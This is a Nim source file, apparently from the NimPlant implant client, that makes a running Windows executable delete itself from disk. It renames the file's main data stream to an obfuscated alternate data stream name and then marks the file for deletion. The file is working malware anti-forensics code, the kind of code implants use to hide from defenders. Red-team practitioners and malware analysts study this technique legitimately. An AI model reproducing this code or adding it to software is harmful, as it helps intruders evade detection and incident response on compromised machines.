# https://github.com/chvancooten/NimPlant/blob/main/client/util/selfDelete.nim

import debug
import strenc
from winim import PathFileExistsW
from winim/lean import HINSTANCE, DWORD, LPVOID, WCHAR, PWCHAR, LPWSTR, HANDLE, NULL, TRUE, WINBOOL, MAX_PATH
from winim/lean import DELETE, OPEN_EXISTING, FILE_DISPOSITION_INFO, INVALID_HANDLE_VALUE, SYNCHRONIZE, FILE_SHARE_READ
from winim/lean import CreateFileW, RtlSecureZeroMemory, RtlCopyMemory, SetFileInformationByHandle, GetModuleFileNameW, CloseHandle

type
  FILE_RENAME_INFO = object
    ReplaceIfExists*: WINBOOL
    RootDirectory*: HANDLE
    FileNameLength*: DWORD
    FileName*: array[8, WCHAR]

proc dsOpenHandle(pwPath: PWCHAR): HANDLE =
    return CreateFileW(pwPath, DELETE or SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, 0)

proc dsRenameHandle(hHandle: HANDLE): WINBOOL =
    let DS_STREAM_RENAME = newWideCString(obf(":msrpcsv"))
    
    var fRename : FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))
    
    # Calculate actual string length in bytes (8 WCHARs for ":msrpcsv")
    let streamLen = 8 * sizeof(WCHAR)  # 16 bytes
    fRename.FileNameLength = (streamLen - sizeof(WCHAR)).DWORD  # Exclude null terminator
    
    var lpwStream : LPWSTR = cast[LPWSTR](DS_STREAM_RENAME[0].unsafeaddr)
    RtlCopyMemory(addr fRename.FileName, lpwStream, streamLen)
    
    return SetFileInformationByHandle(hHandle, 3, addr fRename, (sizeof(fRename) + streamLen).DWORD)  # fileRenameInfo* = 3

proc dsDepositeHandle(hHandle: HANDLE): WINBOOL =
    var fDelete : FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE

    return SetFileInformationByHandle(hHandle, 4, addr fDelete, sizeof(fDelete).DWORD)  # fileDispositionInfo* = 4

proc selfDelete*(): void =
    var
        wcPath : array[MAX_PATH + 1, WCHAR]
        hCurrent : HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath));

    if GetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        debug "[DEBUG] Failed to get the current module handle"
        quit(QuitFailure)

    hCurrent = dsOpenHandle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        debug "[DEBUG] Failed to acquire handle to current running process"
        quit(QuitFailure)

    debug "[DEBUG] Attempting to rename file name"
    if not dsRenameHandle(hCurrent).bool:
        debug "[DEBUG] Failed to rename to stream"
        quit(QuitFailure)

    debug "[DEBUG] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle"
    CloseHandle(hCurrent)

    hCurrent = dsOpenHandle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        debug "[DEBUG] Failed to reopen current module"
        quit(QuitFailure)

    if not dsDepositeHandle(hCurrent).bool:
        debug "[DEBUG] Failed to set delete deposition (file already renamed to ADS, continuing...)"
    else:
        debug "[DEBUG] Successfully set delete deposition"

    debug "[DEBUG] Closing handle to trigger deletion"

    CloseHandle(hCurrent)

    if not PathFileExistsW(addr wcPath[0]).bool:
        debug "[DEBUG] File deleted successfully"